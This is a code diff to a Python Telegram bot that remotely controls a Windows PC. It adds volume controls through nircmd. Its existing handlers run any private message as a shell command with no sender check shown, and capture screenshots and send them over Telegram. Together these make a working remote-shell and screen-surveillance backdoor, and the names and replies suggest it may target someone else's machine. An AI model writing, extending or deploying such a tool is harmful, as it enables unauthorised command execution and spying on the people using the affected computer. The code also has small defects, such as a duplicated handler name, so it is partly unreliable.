@@ -8,8 +8,10 @@ from win10toast import ToastNotifier
 from pyrogram import Client, filters
 from PIL import ImageGrab
 import webbrowser
+from pyrogram.types import Message, BotCommand, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 import random
 import os
+from pyrogram import *
 import requests
 app = Client("my_idiot")
 toaster = ToastNotifier()
@@ -106,12 +108,90 @@ def take_screenshot(client, message):
         photo=buffer,
         caption="тест"
     )
+
+
+# Handler function for the media command
+@app.on_message(filters.command("media"))
+def media_command_handler(client, message):
+    # Define the inline keyboard markup with the volume control buttons
+    volume_control_markup = InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("🔊 -10", callback_data="decrease_volume_10"),
+            InlineKeyboardButton("🔇", callback_data="mute_volume"),
+            InlineKeyboardButton("🔉", callback_data="unmute_volume"),
+            InlineKeyboardButton("🔊 +10", callback_data="increase_volume_10")
+        ]
+    ])
+
+    # Send the volume control buttons with a message
+    client.send_message(
+        message.chat.id,
+        "Select a volume control option:",
+        reply_markup=volume_control_markup
+    )
+
+
+# Handler functions for the volume control buttons
+# Handler functions for the volume control buttons
+@app.on_callback_query(filters.create(lambda _, __, query: query.data == "decrease_volume_10"))
+def decrease_volume_callback_handler(client, callback_query):
+    # Decrease the volume by 10 using the nircmd utility
+    os.system("nircmd.exe changesysvolume -6553")
+
+    # Send a confirmation message
+    client.answer_callback_query(callback_query.id, "Volume decreased by 10.")
+
+
+
+
+@app.on_callback_query(filters.create(lambda _, __, query: query.data == "mute_volume"))
+def mute_volume_callback_handler(client, callback_query):
+    # Mute the volume using the nircmd utility
+    os.system("nircmd.exe mutesysvolume 1")
+
+    # Send a confirmation message
+    client.answer_callback_query(callback_query.id, "Volume muted.")
+
+@app.on_callback_query(filters.create(lambda _, __, query: query.data == "unmute_volume"))
+def mute_volume_callback_handler(client, callback_query):
+    # Mute the volume using the nircmd utility
+    os.system("nircmd.exe mutesysvolume 0")
+
+    # Send a confirmation message
+    client.answer_callback_query(callback_query.id, "Volume unmuted.")
+
+
+@app.on_callback_query(filters.create(lambda _, __, query: query.data == "increase_volume_10"))
+def increase_volume_callback_handler(client, callback_query):
+    # Increase the volume by 10 using the nircmd utility
+    os.system("nircmd.exe changesysvolume 6553")
+
+    # Send a confirmation message
+    client.answer_callback_query(callback_query.id, "Volume increased by 10.")
+
+
+@app.on_message(filters.command("volume"))
+def volume_command_handler(client, message):
+    # Parse the volume level from the command arguments
+    try:
+        volume_level = int(message.command[1])
+    except (IndexError, ValueError):
+        client.send_message(message.chat.id, "Please specify a valid volume level.")
+        return
+    nircmd_volume = int(volume_level * 655.35)
+    # Set the system volume using the Windows command line
+    subprocess.run(["nircmd.exe", "setsysvolume", str(nircmd_volume)])
+
+    # Send a confirmation message
+    client.send_message(message.chat.id, f"Volume set to {volume_level}%")
 @ app.on_message(filters.private)
 def run_command(client, message):
     command = message.text
     try:
         msg = client.send_message(message.chat.id, "Running command...")
         output = subprocess.check_output(command, shell=True)
+        if len(output) > 4096:
+            output = output[:4093] + b""
         if "shutdown" in command:
             print(msg)
             client.edit_message_text(chat_id=message.chat.id, message_id=msg.id, text="Чмо блять")
